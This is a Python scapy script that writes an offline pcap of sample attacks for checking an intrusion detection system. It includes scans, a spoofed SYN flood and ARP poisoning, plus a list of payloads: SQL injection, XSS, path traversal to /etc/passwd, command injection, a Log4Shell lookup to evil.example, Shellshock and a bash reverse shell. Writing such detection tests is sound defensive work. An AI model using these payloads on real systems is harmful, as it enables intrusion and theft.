#!/usr/bin/env python3
"""Synthesise a pcap containing one clean example of every attack the IDS detects.
Used to validate detection offline. No packets touch the wire."""
from __future__ import annotations

import argparse
import random

from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Raw
from scapy.utils import wrpcap

ATTACKER = "192.168.0.50"
TARGET = "192.168.0.166"
GATEWAY = "192.168.0.1"


def eth(payload):
    return Ether(src="08:00:27:5d:9f:d0", dst="a4:83:e7:00:00:01") / payload


def port_scan():
    # 20 distinct ports, SYN — nmap -sS
    return [eth(IP(src=ATTACKER, dst=TARGET) / TCP(sport=40000 + i, dport=p, flags="S"))
            for i, p in enumerate([21,22,23,25,53,80,110,139,143,443,445,993,995,
                                   1723,3306,3389,5432,5900,8080,8443])]


def stealth_scans():
    base = IP(src=ATTACKER, dst=TARGET)
    return [
        eth(base / TCP(sport=40100, dport=80, flags="")),      # NULL
        eth(base / TCP(sport=40101, dport=80, flags="F")),     # FIN
        eth(base / TCP(sport=40102, dport=80, flags="FPU")),   # XMAS
        eth(base / TCP(sport=40103, dport=80, flags="FA")),    # Maimon
    ]


def host_sweep():
    # ICMP echo to 12 hosts — nmap -sn
    return [eth(IP(src=ATTACKER, dst=f"192.168.0.{h}") / ICMP(type=8))
            for h in range(10, 22)]


def syn_flood():
    pkts = []
    for i in range(250):
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkts.append(eth(IP(src=src, dst=TARGET) / TCP(sport=random.randint(1024,65535),
                                                      dport=80, flags="S")))
    return pkts


def arp_spoof():
    return [
        eth(ARP(op=2, psrc=GATEWAY, hwsrc="a4:83:e7:00:00:01", pdst=TARGET)),
        eth(ARP(op=2, psrc=GATEWAY, hwsrc="08:00:27:5d:9f:d0", pdst=TARGET)),  # poisoned
    ]


def brute_force():
    # 30 SSH connection attempts — hydra
    return [eth(IP(src=ATTACKER, dst=TARGET) / TCP(sport=41000 + i, dport=22, flags="S"))
            for i in range(30)]


def icmp_tunnel():
    return [eth(IP(src=ATTACKER, dst=TARGET) / ICMP(type=8) / Raw(load=b"A" * 512))]


def signature_payloads():
    def http(port, body):
        return eth(IP(src=ATTACKER, dst=TARGET) /
                   TCP(sport=42000 + port, dport=port, flags="PA") / Raw(load=body))
    return [
        http(80, b"GET /p?id=1' OR '1'='1 UNION SELECT username,password FROM users-- HTTP/1.1\r\n\r\n"),
        http(80, b"GET /s?q=<script>document.cookie</script> HTTP/1.1\r\n\r\n"),
        http(80, b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: t\r\n\r\n"),
        http(80, b"GET /?cmd=;cat /etc/passwd HTTP/1.1\r\n\r\n"),
        http(8080, b"GET / HTTP/1.1\r\nX-Api: ${jndi:ldap://evil.example/a}\r\n\r\n"),
        http(80, b"GET /cgi-bin/x HTTP/1.1\r\nUser-Agent: () { :; }; /bin/bash -c id\r\n\r\n"),
        http(80, b"GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.7\r\n\r\n"),
        http(80, b"GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.5.0)\r\n\r\n"),
        http(4444, b"bash -i >& /dev/tcp/192.168.0.50/4444 0>&1\n"),
        http(21, b"USER admin\r\nPASS s3cr3t\r\n"),
    ]


def benign():
    # normal-looking traffic that must NOT trigger anything
    pkts = []
    for i in range(20):
        pkts.append(eth(IP(src=TARGET, dst="93.184.216.34") /
                        TCP(sport=50000 + i, dport=443, flags="PA") /
                        Raw(load=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")))
    pkts.append(eth(IP(src=TARGET, dst=GATEWAY) / ICMP(type=8) / Raw(load=b"ping")))
    pkts.append(eth(ARP(op=2, psrc=GATEWAY, hwsrc="a4:83:e7:00:00:01", pdst=TARGET)))
    return pkts


SCENARIOS = {
    "benign": benign, "port_scan": port_scan, "stealth": stealth_scans,
    "host_sweep": host_sweep, "syn_flood": syn_flood, "arp_spoof": arp_spoof,
    "brute_force": brute_force, "icmp_tunnel": icmp_tunnel,
    "signatures": signature_payloads,
}


def main():
    ap = argparse.ArgumentParser(description="Generate a validation attack pcap.")
    ap.add_argument("-o", "--out", default="logs/attack_sim.pcap")
    ap.add_argument("--only", nargs="*", choices=list(SCENARIOS), help="subset")
    args = ap.parse_args()

    chosen = args.only or list(SCENARIOS)
    packets = []
    for name in chosen:
        pk = SCENARIOS[name]()
        packets.extend(pk)
        print(f"  {name:12s} -> {len(pk):4d} packets")
    # timestamp so windows behave; keep near-real time ordering
    t = 1_700_000_000.0
    for i, p in enumerate(packets):
        p.time = t + i * 0.01
    wrpcap(args.out, packets)
    print(f"\nwrote {len(packets)} packets to {args.out}")


if __name__ == "__main__":
    main()
